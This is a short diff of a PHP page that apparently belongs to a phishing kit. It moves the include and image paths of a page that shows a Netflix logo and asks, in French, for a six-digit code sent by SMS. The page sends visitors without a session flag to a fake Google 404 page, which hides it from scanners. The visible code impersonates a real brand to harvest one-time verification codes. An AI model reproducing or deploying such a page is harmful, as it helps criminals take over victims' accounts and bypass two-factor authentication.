@@ -1,7 +1,7 @@
 <?php
 session_start();
-include "./zebi/config.php";
-include "./zebi/functions.php";
+include "config.php";
+include "functions.php";
 
 if ($_SESSION['allow'] != "yes") {
     header('location: https://google.com/404');
@@ -167,7 +167,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <body>
     <div class="container">
         <div class="logo">
-            <img src="files/img/Logonetflix.png" alt="Netflix Logo">
+            <img src="Logonetflix.png" alt="Netflix Logo">
         </div>
         <h2>Vérification du Code</h2>
         <p>Un code à 6 chiffres a été envoyé à votre numéro de téléphone. Veuillez l'entrer ci-dessous.</p>
